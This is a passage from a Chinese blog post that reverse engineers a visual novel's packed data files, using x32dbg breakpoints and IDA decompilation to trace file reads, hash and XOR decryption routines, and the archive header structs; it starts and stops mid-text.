lpOverlapped</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>很容易看出 <code>esp+4 esp+8 esp+c</code>的结构<br>但是这里搜索遇到了直接搜不到的问题<br>解决方法是先断下<code>CreateFileW</code> 然后附近找到<code>jmp &amp;ReadFile</code> 跟踪跳转<br>设置条件断点如下:<br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91(%E5%88%9D%E8%AF%95)/images/image-52.png" alt="img"></p><h4 id="SetFilePointer"><a href="#SetFilePointer" class="headerlink" title="SetFilePointer"></a>SetFilePointer</h4><p>查看Windows官方文档</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">DWORD <span class="title function_">SetFilePointer</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in]                HANDLE hFile,</span></span><br><span class="line"><span class="params">  [in]                LONG   lDistanceToMove,</span></span><br><span class="line"><span class="params">  [in, out, optional] PLONG  lpDistanceToMoveHigh,</span></span><br><span class="line"><span class="params">  [in]                DWORD  dwMoveMethod</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>要注意这里的 高DWORD是 <code>PLONG</code>类型 即 <code>LONG</code>的指针 所以要<code>[[esp+c]]</code><br>设置条件断点如下:</p><p>日志分析:<br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91(%E5%88%9D%E8%AF%95)/images/image-49.png" alt="img"></p><p>那么就可以按照教程的方法 在<code>CreateFileW</code>设置一个条件断点 当<code>Gamexxx</code>的时候断下来 就可以跟踪到<code>xxx.pack</code>的文件操作<br>但我设置后还是每个都断 好在文件不多 手动断到 <code>data0</code> 返回到用户领空<br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91(%E5%88%9D%E8%AF%95)/images/image-50.png" alt="img"><br>对应到IDA其实就是这块 FileOpen (IDA可以用G快速跳转地址)<br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91(%E5%88%9D%E8%AF%95)/images/image-51.png" alt="img"></p><p>当我们断到<code>data0</code>后 开启<code>ReadFile</code>的断点 来看读取了什么内容<br>发现日志输出<br><code>读取文件   句柄:3AC   缓冲:19FCDB  字节数:1C</code><br>回到用户领空<br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91(%E5%88%9D%E8%AF%95)/images/image-53.png" alt="img"><br>有个<code>FilePackVer3.0</code>的字样<br>注意前面的<code>00 E8 FC 19</code>  小端序转一下就是 <code>19FCE8</code>  指向的正好是 <code>Filexxx</code>字串结束后的地址</p><p>接下来继续调试 发现就开始计算hash了<br>首先判断<code>FilePackVer</code>的版本 然后进行对应的hash操作<br>IDA可以很直观的看到<br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91(%E5%88%9D%E8%AF%95)/images/image-54.png" alt="img"><br>进入<code>sub_4880c0</code><br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91(%E5%88%9D%E8%AF%95)/images/image-55.png" alt="img"><br>从<code>LStrCmp</code>那里的比较往前看 <code>v17&lt;-v18&lt;-v4&lt;-v1</code><br>所以 <code>sub_483DA8</code>和<code>sub_48318C</code>都很关键</p><p>再前面的间接函数调用x32dbg动调可知就是 <code>FileRead</code> 而且读的是<code>data0.pack</code>的内容<br>而且在x32dbg动调的时候发现多出来一个 <code>data0.hash</code><br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91(%E5%88%9D%E8%AF%95)/images/image-56.png" alt="img"></p><p>程序从<code>0019F880</code>开始读取了256数据后进入<code>sub_483DA8</code><br>里面采用的<code>MMX指令集</code><br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91(%E5%88%9D%E8%AF%95)/images/image-57.png" alt="img"></p><p>sub_483DA8</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">sub_483DA8</span><span class="params">(__m64 *a1, <span class="type">unsigned</span> <span class="type">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// ecx</span></span><br><span class="line">  __m64 v5; <span class="comment">// mm0</span></span><br><span class="line">  __m64 v6; <span class="comment">// mm2</span></span><br><span class="line">  __m64 v7; <span class="comment">// mm3</span></span><br><span class="line">  __m64 v8; <span class="comment">// mm3</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a2 &lt; <span class="number">8</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  v4 = a2 &gt;&gt; <span class="number">3</span>;</span><br><span class="line">  v5.m64_u64 = <span class="number">0</span>i64;</span><br><span class="line">  v6.m64_u64 = <span class="number">0</span>i64;</span><br><span class="line">  v7 = _mm_cvtsi32_si64(<span class="number">0x3070307</span>u);</span><br><span class="line">  v8 = _m_punpckldq(v7, v7);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v6 = _m_paddw(v6, v8);</span><br><span class="line">    v5 = _m_paddw(v5, _m_pxor((__m64)a1-&gt;m64_u64, v6));</span><br><span class="line">    ++a1;</span><br><span class="line">    --v4;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v4 );</span><br><span class="line">  _m_empty();</span><br><span class="line">  <span class="keyword">return</span> _mm_cvtsi64_si32(_m_pxor(v5, _m_psrlqi(v5, <span class="number">0x20</span>u)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>返回后继续跟进 <code>sub_48318C</code><br>走的是<code>if(a3)</code>的分支<br><code>sub_48310C</code></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span> __cdecl <span class="title">sub_48310C</span><span class="params">(<span class="type">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// ecx</span></span><br><span class="line">  __m64 *v3; <span class="comment">// edx</span></span><br><span class="line">  __m64 v4; <span class="comment">// mm7</span></span><br><span class="line">  __m64 v5; <span class="comment">// mm7</span></span><br><span class="line">  __m64 v6; <span class="comment">// mm6</span></span><br><span class="line">  __m64 v7; <span class="comment">// mm6</span></span><br><span class="line">  __m64 v8; <span class="comment">// mm5</span></span><br><span class="line">  __m64 v9; <span class="comment">// mm5</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v10; <span class="comment">// [esp-4h] [ebp-10h]</span></span><br><span class="line"></span><br><span class="line">  result = (*(_DWORD *)(a1 + <span class="number">8</span>) + *(_DWORD *)(a1 - <span class="number">4</span>)) ^ <span class="number">0xFEC9753E</span>;</span><br><span class="line">  <span class="keyword">if</span> ( *(_DWORD *)(a1 - <span class="number">4</span>) &gt;&gt; <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v10 = *(_DWORD *)(a1 - <span class="number">8</span>);</span><br><span class="line">    v2 = *(_DWORD *)(a1 - <span class="number">4</span>) &gt;&gt; <span class="number">3</span>;</span><br><span class="line">    v3 = (__m64 *)v10;</span><br><span class="line">    v4 = _mm_cvtsi32_si64(<span class="number">0xA73C5F9D</span>);</span><br><span class="line">    v5 = _m_punpckldq(v4, v4);</span><br><span class="line">    v6 = _mm_cvtsi32_si64(<span class="number">0xCE24F523</span>);</span><br><span class="line">    v7 = _m_punpckldq(v6, v6);</span><br><span class="line">    v8 = _mm_cvtsi32_si64((*(_DWORD *)(a1 + <span class="number">8</span>) + *(_DWORD *)(a1 - <span class="number">4</span>)) ^ <span class="number">0xFEC9753E</span>);</span><br><span class="line">    v9 = _m_punpckldq(v8, v8);</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v5 = _m_pxor(_m_paddd(v5, v7), v9);</span><br><span class="line">      v9 = _m_pxor((__m64)v3-&gt;m64_u64, v5);</span><br><span class="line">      v3-&gt;m64_u64 = (<span class="type">unsigned</span> __int64)v9;</span><br><span class="line">      ++v3;</span><br><span class="line">      --v2;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v2 );</span><br><span class="line">    _m_empty();</span><br><span class="line">    result = v10;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这就很有感觉了<br>这里先跳过 ret后<code>eax:0019F85C</code> 存储的就是计算后的结果<br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91(%E5%88%9D%E8%AF%95)/images/image-58.png" alt="img"></p><p>验签完过后的一堆赋值操作最开始被我忽略掉了…<br>其实仔细看会发现是跟 <code>FilePack</code>的结构体有关!!!<br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91(%E5%88%9D%E8%AF%95)/images/image-59.png" alt="img"><br>分别取了三部分的四字节数据</p><p>其中出现了<code>cdq</code>指令:<br>IDA给出了定义 <code>EAX -&gt; EDX:EAX (with sign)</code><br>这是为了兼容64位寄存器的情况<br>这里把eax和edx合并了<br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91(%E5%88%9D%E8%AF%95)/images/image-60.png" alt="img"><br>结合eax的<code>14D</code>指向的是<br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91(%E5%88%9D%E8%AF%95)/images/image-61.png" alt="img"><br>可以猜测这个应该是结构体存储的一个跳转&#x2F;入口地址</p><p>大致分析一下 <code>FilePack</code>结构体的结构</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">FilePack</span>&#123;</span><br><span class="line">    <span class="type">char</span> version[<span class="number">0x10</span>]; <span class="comment">// FilePackVer3.0</span></span><br><span class="line">    DWORD Size; <span class="comment">// maybe</span></span><br><span class="line">    QWORD EntryPoint; <span class="comment">// probably </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后试着写解出来的HashData结构体也就是<code>8hrxxx</code>这一串开头的结构<br>是通过日志发现读取的0x440大小的数据就是这个<code>HashData</code><br><code>读取文件   句柄:3AC   缓冲:19F85C  字节数:440</code></p><p>大致观察一下结构可以注意到一个点<br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91(%E5%88%9D%E8%AF%95)/images/image-62.png" alt="img"><br>这个<code>HashData</code>结构体的最后一个成员就是 <code>FilePack</code>结构体</p><p>然后后面有个<code>CopyFrom</code> 日志输出 <code>读取文件   句柄:3AC   缓冲:27BB580  字节数:14D</code><br>而指向的是 <code>HashVer1.4</code>这块<br>所以可以推出<code>8hrxx</code>0x20后的<code>4D 01 00 00</code>就是读取的字节数size</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">HashData</span>&#123;</span><br><span class="line">    <span class="type">char</span> HashHead[<span class="number">0x20</span>]; <span class="comment">// 8hrxxx</span></span><br><span class="line">    DWORD HashVerSize; <span class="comment">// 从HashVer1.4读取的字节数</span></span><br><span class="line"></span><br><span class="line">    FilePack filepack;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其他的目前还原不出来… 继续看</p><h3 id="HashVer的处理"><a href="#HashVer的处理" class="headerlink" title="HashVer的处理"></a>HashVer的处理</h3><p>从这里开始就很不好分析了<br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91(%E5%88%9D%E8%AF%95)/images/image-64.png" alt="img"><br>主要是一个函数内有多种操作 步进不现实 步过又容易漏…<br>注意到<code>488201</code>处<code>CopyFrom</code>读取了Hashver部分的数据<br>后面的setpoint结合后面的<code>[eax+4]</code>知道指向了HashVer的头部 然后进入那个多功能的函数<br>在这里<br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91(%E5%88%9D%E8%AF%95)/images/image-65.png" alt="img"><br>看到拷贝了0x20的HashVer 但是对比时只用到了0x10 所以后0x10是用于其他目的<br>然后一直对比到ver1.4<br>又进行了一次Read<br>后面对读入的数据处理<br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91(%E5%88%9D%E8%AF%95)/images/image-66.png" alt="img"></p><p>后面建了一个类 然后用CopyFrom对类写入了数据<br>这里学到一个技巧 x32dbg用添加标签对函数重命名 更方便查看<br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91(%E5%88%9D%E8%AF%95)/images/image-67.png" alt="img"><br>把 <code>sub_48318C</code>重命名为 <code>decrypt</code><br>这个是前面出现过的一个解密函数 当时解出来的就是 HashData的开头<code>8xx</code></p><p>然后后面又出现了一个跟<code>decrypt</code>结构很相似的解密函数 <code>decrypt2</code></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">sub_483D80</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> a2, <span class="type">int</span> a3, <span class="type">int</span> a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> savedregs; <span class="comment">// [esp+8h] [ebp+0h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a2 )</span><br><span class="line">    result = <span class="built_in">sub_483410</span>(&amp;savedregs);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = <span class="built_in">sub_483988</span>(&amp;savedregs);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里根据<code>a2</code>的不同选择不同的算法<br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91(%E5%88%9D%E8%AF%95)/images/image-68.png" alt="img"><br>这里的eax传的是前面建的与HashVer数据有关的类 解密返回的结果也是一个类</p><p>前面有个很关键的点看漏了 当对<code>HashVer</code>解密后 会check<code>HashVer1.4</code>后的第5个DWORD值<br>分1,2,other 不同跳转<br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91(%E5%88%9D%E8%AF%95)/images/image-69.png" alt="img"></p><p>1 就是我们的<code>decrypt2</code><br>其中decrypt2的函数<br><code>sub_483410</code>:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Classes::TStream *__cdecl <span class="title">sub_483410</span><span class="params">(<span class="type">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> *v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> *v2; <span class="comment">// esi</span></span><br><span class="line">  Classes::TStream *v3; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">char</span> *v4; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">char</span> v9[<span class="number">256</span>]; <span class="comment">// [esp+Ch] [ebp-424h]</span></span><br><span class="line">  <span class="type">char</span> v10[<span class="number">512</span>]; <span class="comment">// [esp+10Ch] [ebp-324h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v11[<span class="number">256</span>]; <span class="comment">// [esp+30Ch] [ebp-124h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// [esp+40Ch] [ebp-24h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v13; <span class="comment">// [esp+410h] [ebp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v14; <span class="comment">// [esp+414h] [ebp-1Ch]</span></span><br><span class="line">  _BYTE *v15; <span class="comment">// [esp+418h] [ebp-18h]</span></span><br><span class="line">  Classes::TStream *v16; <span class="comment">// [esp+41Ch] [ebp-14h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v17; <span class="comment">// [esp+420h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v18; <span class="comment">// [esp+424h] [ebp-Ch]</span></span><br><span class="line">  <span class="type">int</span> v19; <span class="comment">// [esp+428h] [ebp-8h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v20; <span class="comment">// [esp+42Fh] [ebp-1h]</span></span><br><span class="line"></span><br><span class="line">  Classes::TStream::<span class="built_in">SetPosition</span>(*(Classes::TStream **)(a1 - <span class="number">4</span>), <span class="number">0</span>i64);</span><br><span class="line">  v19 = <span class="number">0</span>;</span><br><span class="line">  v1 = v10;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">    *v1++ = v19++;</span><br><span class="line">  <span class="keyword">while</span> ( v19 != <span class="number">256</span> );</span><br><span class="line">  (*(<span class="built_in">void</span> (__fastcall **)(_DWORD, <span class="type">unsigned</span> <span class="type">int</span> *, <span class="type">int</span>))(**(_DWORD **)(a1 - <span class="number">4</span>) + <span class="number">12</span>))(*(_DWORD *)(a1 - <span class="number">4</span>), &amp;v13, <span class="number">4</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v13 == <span class="number">0xFF435031</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    (*(<span class="built_in">void</span> (__fastcall **)(_DWORD, <span class="type">int</span> *, <span class="type">int</span>))(**(_DWORD **)(a1 - <span class="number">4</span>) + <span class="number">12</span>))(*(_DWORD *)(a1 - <span class="number">4</span>), &amp;v12, <span class="number">4</span>);</span><br><span class="line">    (*(<span class="built_in">void</span> (__fastcall **)(_DWORD, <span class="type">unsigned</span> <span class="type">int</span> *, <span class="type">int</span>))(**(_DWORD **)(a1 - <span class="number">4</span>) + <span class="number">12</span>))(*(_DWORD *)(a1 - <span class="number">4</span>), &amp;v17, <span class="number">4</span>);</span><br><span class="line">    v2 = (<span class="type">char</span> *)(*(_DWORD *)(*(_DWORD *)(a1 - <span class="number">4</span>) + <span class="number">4</span>) + <span class="number">12</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)(a1 - <span class="number">5</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *(_BYTE *)(a1 + <span class="number">8</span>) )</span><br><span class="line">        System::TObject::<span class="built_in">Free</span>(*(System::TObject **)(a1 - <span class="number">4</span>));</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    v12 = <span class="number">0</span>;</span><br><span class="line">    v17 = v13;</span><br><span class="line">    v2 = (<span class="type">char</span> *)(*(_DWORD *)(*(_DWORD *)(a1 - <span class="number">4</span>) + <span class="number">4</span>) + <span class="number">4</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v17 &lt;= <span class="number">0x20000000</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v16 = (Classes::TStream *)TObject::`..<span class="number">.&#x27;</span>((VMT *)&amp;cls_Classes_TMemoryStream, <span class="number">1</span>);</span><br><span class="line">    (*(<span class="built_in">void</span> (__fastcall **)(Classes::TStream *, <span class="type">unsigned</span> <span class="type">int</span>))(*(_DWORD *)v16 + <span class="number">4</span>))(v16, v17);</span><br><span class="line">    Classes::TStream::<span class="built_in">SetPosition</span>(v16, <span class="number">0</span>i64);</span><br><span class="line">    v15 = (_BYTE *)*((_DWORD *)v16 + <span class="number">1</span>);</span><br><span class="line">    v14 = *(_DWORD *)(*(_DWORD *)(a1 - <span class="number">4</span>) + <span class="number">4</span>) + (***(<span class="built_in">int</span> (__fastcall ****)(_DWORD))(a1 - <span class="number">4</span>))(*(_DWORD *)(a1 - <span class="number">4</span>));</span><br><span class="line">LABEL_36:</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)v2 &lt; v14 )</span><br><span class="line">    &#123;</span><br><span class="line">      v20 = *v2;</span><br><span class="line">      v4 = v2 + <span class="number">1</span>;</span><br><span class="line">      <span class="built_in">idr617538_Move</span>(v10, v11, <span class="number">256</span>);</span><br><span class="line">      v5 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v20 &gt; <span class="number">0x7F</span>u )</span><br><span class="line">        &#123;</span><br><span class="line">          v5 += v20 - <span class="number">127</span>;</span><br><span class="line">          v20 = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( v5 &gt; <span class="number">0xFF</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        v6 = v20 + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">          v11[v5] = *v4++;</span><br><span class="line">          <span class="keyword">if</span> ( v5 != (<span class="type">unsigned</span> __int8)v11[v5] )</span><br><span class="line">            v10[v5 + <span class="number">256</span>] = *v4++;</span><br><span class="line">          ++v5;</span><br><span class="line">          --v6;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> ( v6 );</span><br><span class="line">        <span class="keyword">if</span> ( v5 &gt; <span class="number">0xFF</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        v20 = *v4++;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( (v12 &amp; <span class="number">1</span>) == <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v18 = *(<span class="type">unsigned</span> __int16 *)v4;</span><br><span class="line">        v2 = v4 + <span class="number">2</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v18 = *(_DWORD *)v4;</span><br><span class="line">        v2 = v4 + <span class="number">4</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      v19 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v19 )</span><br><span class="line">        &#123;</span><br><span class="line">          v7 = (<span class="type">unsigned</span> __int8)v9[--v19];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( !v18 )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_36;</span><br><span class="line">          --v18;</span><br><span class="line">          v7 = (<span class="type">unsigned</span> __int8)*v2++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( v7 == (<span class="type">unsigned</span> __int8)v11[v7] )</span><br><span class="line">        &#123;</span><br><span class="line">          *v15++ = v7;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          v9[v19++] = v10[v7 + <span class="number">256</span>];</span><br><span class="line">          v9[v19++] = v11[v7];</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)(a1 + <span class="number">8</span>) )</span><br><span class="line">      System::TObject::<span class="built_in">Free</span>(*(System::TObject **)(a1 - <span class="number">4</span>));</span><br><span class="line">    v3 = v16;</span><br><span class="line">    Classes::TStream::<span class="built_in">SetPosition</span>(v16, <span class="number">0</span>i64);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)(a1 + <span class="number">8</span>) )</span><br><span class="line">      System::TObject::<span class="built_in">Free</span>(*(System::TObject **)(a1 - <span class="number">4</span>));</span><br><span class="line">    v3 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出是一个比较复杂的算法 但是既然是解压函数 我们就不需要逆向算法了<br>关注下这个算法的流程<br>先计算了一个东西 然后 check <code>if ( v13 == 0xFF435031 